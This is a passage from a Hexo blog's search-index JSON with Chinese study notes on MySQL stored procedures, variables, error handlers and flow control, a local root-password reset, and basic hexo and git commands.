&#125;# DEFINER ，表示只有定义者自己才能够执行。INVOKER ，表示调用者可以执行。COMMENT &#x27;string’# 表示注释信息 删除1DROP &#123;PROCEDURE | FUNCTION&#125; [IF EXISTS] 存储过程或函数的名 变量系统变量分为全局系统变量（需要添加 global 关键字）以及会话系统变量（需要添加 session 关键字），有时也把全局系统变量简称为全局变量，有时也把会话系统变量称为local变量。如果不写，默认会话级别。静态变量（在 MySQL 服务实例运行期间它们的值不能使用 set 动态修改）属于特殊的全局系统变量。 系统变量查看变量 指令 描述 SHOW GLOBAL VARIABLES 查看所有全局变量 SHOW SESSION VARIABLES 或 SHOW VARIABLES 查看所有会话变量 SHOW GLOBAL VARIABLES LIKE ‘%标识符%’ 查看满足条件部分全局变量 SHOW SESSION VARIABLES LIKE ‘%标识符%’ 查看满足条件部分会话变量 作为 MySQL 编码规范，MySQL 中的系统变量以 两个“@” 开头，其中“@@global”仅用于标记全局系统变量，“@@session”仅用于标记会话系统变量。“@@”首先标记会话系统变量，如果会话系统变量不存在，则标记全局系统变量。 查看指定系统变量 指令 描述 SELECT @@global.变量名； 查看指定的系统变量值 SELECT @@session.变量名；或 SELECT @@变量名; 查看指定的会话变量值 修改变量12345678910#为全局变量赋值#方式1:SET @@global.变量名=变量值;#方式2：SET GLOBAL 变量名=变量值;#为某个会话变量赋值#方式1：SET @@session.变量名=变量值;#方式2：SET SESSION 变量名=变量值 用户变量用户变量是用户自己定义的，作为 MySQL 编码规范，MySQL 中的用户变量以 一个“@” 开头。根据作用范围不同，又分为 会话用户变量 和 局部变量 。 会话用户变量：作用域和会话变量一样，只对 当前连接 会话有效。 局部变量：只在 BEGIN 和 END 语句块中有效。局部变量只能在 存储过程和函数 中使用。 定义变量123456#方式1：“=”或“:=”SET @用户变量 = 值;SET @用户变量 := 值;#方式2：“:=” 或 INTO关键字SELECT @用户变量 := 表达式 [FROM 等子句];SELECT 表达式 INTO @用户变量 [FROM 等子句]; Eg: 1SELECT AVG(salary) INTO @avgsalary FROM employees 查看变量1SELECT @用户变量 局部变量 定义：可以使用 DECLARE 语句定义一个局部变量； 作用域：仅仅在定义它的 BEGIN … END 中有效； 位置：只能放在 BEGIN … END 中，而且只能放在第一句； 12345678910BEGIN#声明局部变量DECLARE 变量名1 变量数据类型 [DEFAULT 变量默认值];DECLARE 变量名2,变量名3,... 变量数据类型 [DEFAULT 变量默认值];#为局部变量赋值SET 变量名1 = 值;SELECT 值 INTO 变量名2 [FROM 子句];#查看局部变量的值SELECT 变量1,变量2,变量3;END 定义变量1DECLARE 变量名 类型 [default 值]; # 如果没有DEFAULT子句，初始值为NULL 赋值变量123SET 变量名=值;SET 变量名:=值;SELECT 字段名或表达式 INTO 变量名 FROM 表; 定义条件与处理程序定义条件就是给MySQL中的错误码命名，这有助于存储的程序代码更清晰。它将一个 错误名字 和 指定的错误条件 关联起来。这个名字可以随后被用在定义处理程序的 DECLARE HANDLER 语句中。定义条件使用DECLARE语句，语法格式如下： 1DECLARE 错误名称 CONDITION FOR 错误码（或错误条件） MySQL_error_code 和 sqlstate_value 都可以表示MySQL的错误。 MySQL_error_code是数值类型错误代码。 sqlstate_value是长度为5的字符串类型错误代码。 例如，在ERROR 1418 (HY000)中，1418是MySQL_error_code，’HY000’是sqlstate_value。 例如，在ERROR 1142（42000）中，1142是MySQL_error_code，’42000’是sqlstate_value 可以为SQL执行过程中发生的某种类型的错误定义特殊的处理程序。定义处理程序时，使用DECLARE语句的语法如下： 1DECLARE 处理方式 HANDLER FOR 错误类型 处理语句 处理方式：处理方式有3个取值：CONTINUE、EXIT、UNDO。 CONTINUE ：表示遇到错误不处理，继续执行。 EXIT ：表示遇到错误马上退出。 UNDO ：表示遇到错误后撤回之前的操作。MySQL中暂时不支持这样的操作。 错误类型（即条件）可以有如下取值： SQLSTATE ‘字符串错误码’ ：表示长度为5的sqlstate_value类型的错误代码； MySQL_error_code ：匹配数值类型错误代码； 错误名称 ：表示DECLARE … CONDITION定义的错误条件名称。 SQLWARNING ：匹配所有以01开头的SQLSTATE错误代码； NOT FOUND ：匹配所有以02开头的SQLSTATE错误代码； SQLEXCEPTION ：匹配所有没有被SQLWARNING或NOT FOUND捕获的SQLSTATE错误代码； 处理语句：如果出现上述条件之一，则采用对应的处理方式，并执行指定的处理语句。语句可以是像“ SET 变量 &#x3D; 值 ”这样的简单语句，也可以是使用 BEGIN … END 编写的复合语句。 Eg: 12345678910111213#方法1：捕获sqlstate_valueDECLARE CONTINUE HANDLER FOR SQLSTATE &#x27;42S02&#x27; SET @info = &#x27;NO_SUCH_TABLE&#x27;;#方法2：捕获mysql_error_valueDECLARE CONTINUE HANDLER FOR 1146 SET @info = &#x27;NO_SUCH_TABLE&#x27;;#方法3：先定义条件，再调用DECLARE no_such_table CONDITION FOR 1146;DECLARE CONTINUE HANDLER FOR NO_SUCH_TABLE SET @info = &#x27;NO_SUCH_TABLE&#x27;;#方法4：使用SQLWARNINGDECLARE EXIT HANDLER FOR SQLWARNING SET @info = &#x27;ERROR&#x27;;#方法5：使用NOT FOUNDDECLARE EXIT HANDLER FOR NOT FOUND SET @info = &#x27;NO_SUCH_TABLE&#x27;;#方法6：使用SQLEXCEPTIONDECLARE EXIT HANDLER FOR SQLEXCEPTION SET @info = &#x27;ERROR&#x27;; 流程控制IF语法 1234IF 表达式1 THEN 操作1[ELSEIF 表达式2 THEN 操作2]……[ELSE 操作N]END IF Eg: 12345678910111213141516DELIMITER //CREATE PROCEDURE update_salary_by_eid2(IN emp_id INT)BEGINDECLARE emp_salary DOUBLE;DECLARE hire_year DOUBLE;SELECT salary INTO emp_salary FROM employees WHERE employee_id = emp_id;SELECT DATEDIFF(CURDATE(),hire_date)/365 INTO hire_yearFROM employees WHERE employee_id = emp_id;IF emp_salary &lt; 8000 AND hire_year &gt; 5THEN UPDATE employees SET salary = salary + 500 WHERE employee_id =emp_id;ELSEUPDATE employees SET salary = salary + 100 WHERE employee_id = emp_id;END IF;END //DELIMITER ; CASE语法 123456789101112131415#情况一：类似于switchCASE 表达式WHEN 值1 THEN 结果1或语句1(如果是语句，需要加分号)WHEN 值2 THEN 结果2或语句2(如果是语句，需要加分号)...ELSE 结果n或语句n(如果是语句，需要加分号)END [case]（如果是放在begin end中需要加上case，如果放在select后面不需要）#情况二：类似于多重ifCASEWHEN 条件1 THEN 结果1或语句1(如果是语句，需要加分号)WHEN 条件2 THEN 结果2或语句2(如果是语句，需要加分号)...ELSE 结果n或语句n(如果是语句，需要加分号)END [case]（如果是放在begin end中需要加上case，如果放在select后面不需要） Eg: 123456789101112CASE valWHEN 1 THEN SELECT &#x27;val is 1&#x27;;WHEN 2 THEN SELECT &#x27;val is 2&#x27;;ELSE SELECT &#x27;val is not 1 or 2&#x27;;END CASE;CASEWHEN val IS NULL THEN SELECT &#x27;val is null&#x27;;WHEN val &lt; 0 THEN SELECT &#x27;val is less than 0&#x27;;WHEN val &gt; 0 THEN SELECT &#x27;val is greater than 0&#x27;;ELSE SELECT &#x27;val is 0&#x27;;END CASE; LOOPLOOP循环语句用来重复执行某些语句。LOOP内的语句一直重复执行直到循环被退出（使用LEAVE子句），跳出循环过程。 123456#add_loop是循环名称，可以省略[loop_label:] LOOP循环体IF 跳出条件 THEN LEAVE [loop_label];END IF;END LOOP [loop_label]; Eg: 12345678910111213141516DELIMITER //CREATE PROCEDURE update_salary_loop(OUT num INT)BEGINDECLARE avg_salary DOUBLE;DECLARE loop_count INT DEFAULT 0;SELECT AVG(salary) INTO avg_salary FROM employees;label_loop:LOOPIF avg_salary &gt;= 12000 THEN LEAVE label_loop;END IF;UPDATE employees SET salary = salary * 1.1;SET loop_count = loop_count + 1;SELECT AVG(salary) INTO avg_salary FROM employees;END LOOP label_loop;SET num = loop_count;END //DELIMITER ; WHILEWHILE语句创建一个带条件判断的循环过程。WHILE在执行语句执行时，先对指定的表达式进行判断，如果为真，就执行循环内的语句，否则退出循环。WHILE语句的基本格式如下： 123[while_label:] WHILE 循环条件 DO循环体END WHILE [while_label]; while_label为WHILE语句的标注名称；如果循环条件结果为真，WHILE语句内的语句或语句群被执行，直至循环条件为假，退出循环。 REPEAT 循环先执行一次，再判断 REPEAT语句创建一个带条件判断的循环过程。与WHILE循环不同的是，REPEAT 循环首先会执行一次循环，然后在 UNTIL 中进行表达式的判断，如果满足条件就退出，即 END REPEAT；如果条件不满足，则会就继续执行循环，直到满足退出条件为止 1234[repeat_label:]REPEAT 循环体UNTIL 结束条件表达式END REPEAT [repeat_label]; LEAVELEAVE语句：可以用在循环语句内，或者以 BEGIN 和 END 包裹起来的程序体内，表示跳出循环或者跳出程序体的操作。如果你有面向过程的编程语言的使用经验，你可以把 LEAVE 理解为 break。 1LEAVE 标记名 其中，label参数表示循环的标志。LEAVE和BEGIN … END或循环一起被使用。 ITERATE 等同于continue ITERATE语句：只能用在循环语句（LOOP、REPEAT和WHILE语句）内，表示重新开始循环，将执行顺序转到语句段开头处。如果你有面向过程的编程语言的使用经验，你可以把 ITERATE 理解为 continue，意思为“再次循环”。 1ITERATE label 游标事务控制 指令 说明 set autocommit=0 开启事务 rollback 回滚 commit 事务提交 Q&amp;Aroot用户密码忘记该如何重置 通过任务管理或服务管理，关掉mysqld(服务进程)； 通过命令行+特殊参数开启mysqld； &lt;mysqld --defaults-file=&quot;D:\\ProgramFiles\\mysql\\MySQLServer5.7Data\\my.ini&quot; --skip-grant-tables 此时，mysqld服务进程已打开，并且不需要权限检查； mysql -uroot 无密码登录服务器，另启动一个客户端进行； 修改权限表： use mysql update user set authentication_string=password(&#39;新密码&#39;) where user=&#39;root&#39; and Host=&#39;localhost&#39;; flush privileges; 通过任务管理器，关掉mysqld服务进程； 再次通过服务管理，打开mysql服务； 即可用修改后的新代码登录。 ​","categories":[{"name":"后端","slug":"后端","permalink":"https://erickinyae.github.io/categories/%E5%90%8E%E7%AB%AF/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"https://erickinyae.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"hexo","slug":"hexo","date":"2023-11-04T15:41:40.000Z","updated":"2023-11-07T00:56:42.000Z","comments":true,"path":"2023/11/04/hexo/","permalink":"https://erickinyae.github.io/2023/11/04/hexo/","excerpt":"","text":"hexo基础指令 指令 作用 备注 发布与上线 hexo g -d 创建新文章 hexo new “title” 本地启动 hexo s","categories":[{"name":"其他","slug":"其他","permalink":"https://erickinyae.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[]},{"title":"git","slug":"git","date":"2023-10-21T15:57:30.000Z","updated":"2023-11-09T05:53:51.386Z","comments":true,"path":"2023/10/21/git/","permalink":"https://erickinyae.github.io/2023/10/21/git/","excerpt":"","text":"添加与提交代码的提交分为两个部分，分别是提交到缓存区，和提交到仓库。 提交到缓存区的方法为: 1git add &lt;filename&gt; 将代码从缓存区提交到仓库的方法为： 1git commit -m &lt;提交说明&gt; &lt;filename&gt; 1eg: git commit -m &quot;first commit&quot; ./agent.jar 当代码拉取到本地1git pull &lt;remote name&gt; &lt;branch&gt; 示例 1git pull git-demo master 克隆仓库代码到本地1git clone &lt;仓库链接&gt; 克隆操作会做以下三件事情： 拉取代码； 初始化本地仓库； 创建别名； 当前版本更改更改当前的版本代码，以实现代码版本回退的功能： 1git reset --hard &lt;代码版本号&gt; 代码版本号可以用git reflog 查到； 代码版本更改的底层原理是修改head指针指向的版本代码位置； git日志查看查看简单日志： 1git reflog 查看详细日志： 1git log git分支操作 命令名称 作用 git branch 分支名 创建分支 git branch -v 查看分支 git checkout 分支名 切换分支 git merge 分支名 把指定的分支合并到当前分支上 一般情况下，每次写代码都需要将别人的代码先merge下来 12git merge hot-fix#将hot-fix分支上的代码merge到当前分支上进行合并； 代码冲突时当代码冲突时，需要人为的到代码中去选择要删除和保留哪些内容，然后！ 第一步，手动的将修改完成的代码加入到缓存区（git add &lt;filename&gt;)； 第二步，执行提交，此时使用git commit -m &lt;描述信息&gt; 时，不能带文件名。 不同分支时代码提交(pull request) 让master主分支将我拉到该项目的团队中，然后fork一份代码库给到我的分支中； 自己首先需要将代码clone下来，然后进行开发、修改等操作； 开发、修改完成后，需要将代码push到属于我的分支的代码库中； pull request：需要给其他分支发起推送请求，并等待其审核，如果代码没问题则合并到目标分支的代码中； git本地给远程库创建一个别名 代码 含义 git remote -v 查看当前远程库-别名列表； git remote add &lt;别名&gt; &lt;远程地址&gt; 给远程库取一个名字 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;","categories":[{"name":"后端","slug":"后端","permalink":"https://erickinyae.github.io/categories/%E5%90%8E%E7%AB%AF/"}],"tags":[{"name":"CI\\CD","slug":"CI-CD","permalink":"https://erickinyae.github.io/tags/CI-CD/"}]}],"categories":[{"name":"前端","slug":"前端","permalink":"https://erickinyae.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"安全","slug":"安全","permalink":"https://erickinyae.github.io/categories/%E5%AE%89%E5%85%A8/"},{"name":"其他","slug":"其他","permalink":"https://erickinyae.github.io/categories/%E5%85%B6%E4%BB%96/"},{"name":"网络","slug":"网络","permalink":"https://erickinyae.github.io/categories/%E7%BD%91%E7%BB%9C/"},{"name":"后端","slug":"后端","permalink":"https://erickinyae.github.io/categories/%E5%90%8E%E7%AB%AF/"}],"tags":[{"name":"框架","slug":"框架","permalink":"https://erickinyae.github.io/tags/%E6%A1%86%E6%9E%B6/"},{"name":"代码审计","slug":"代码审计","permalink":"https://erickinyae.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"审计","slug":"审计","permalink":"https://erickinyae.github.io/tags/%E5%AE%A1%E8%AE%A1/"},{"name":"基础","slug":"基础","permalink":"https://erickinyae.github.io/tags/%E5%9F%BA%E7%A1%80/"},{"name":"鉴权","slug":"鉴权","permalink":"https://erickinyae.github.io/tags/%E9%89%B4%E6%9D%83/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://erickinyae.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"数据库","slug":"数据库","permalink":"https://erickinyae.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"CI\\CD","slug":"CI-CD","permalink":"https://erickinyae.github.io/tags/CI-CD/"}]}